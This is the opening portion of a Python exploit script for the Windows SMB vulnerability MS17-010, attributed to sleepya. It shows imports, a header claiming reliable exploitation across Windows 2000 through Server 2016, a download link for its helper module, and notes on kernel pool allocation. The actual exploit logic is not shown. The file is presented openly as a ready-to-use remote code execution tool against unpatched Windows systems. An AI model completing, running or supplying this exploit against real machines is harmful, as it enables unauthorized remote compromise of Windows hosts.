#!/usr/bin/python
from impacket import smb, smbconnection
from mysmb import MYSMB
from struct import pack, unpack, unpack_from
import sys
import socket
import time

'''
MS17-010 exploit for Windows 2000 and later by sleepya

EDB Note: mysmb.py can be found here ~ https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/42315.py

Note:
- The exploit should never crash a target (chance should be nearly 0%)
- The exploit use the bug same as eternalromance and eternalsynergy, so named pipe is needed

Tested on:
- Windows 2016 x64
- Windows 10 Pro Build 10240 x64
- Windows 2012 R2 x64
- Windows 8.1 x64
- Windows 2008 R2 SP1 x64
- Windows 7 SP1 x64
- Windows 2008 SP1 x64
- Windows 2003 R2 SP2 x64
- Windows XP SP2 x64
- Windows 8.1 x86
- Windows 7 SP1 x86
- Windows 2008 SP1 x86
- Windows 2003 SP2 x86
- Windows XP SP3 x86
- Windows 2000 SP4 x86
'''

USERNAME = ''
PASSWORD = ''

'''
A transaction with empty setup:
- it is allocated from paged pool (same as other transaction types) on Windows 7 and later
- it is allocated from private heap (RtlAllocateHeap()) with no on use it on Windows Vista and earlier
- no lookaside or caching method for allocating it

'''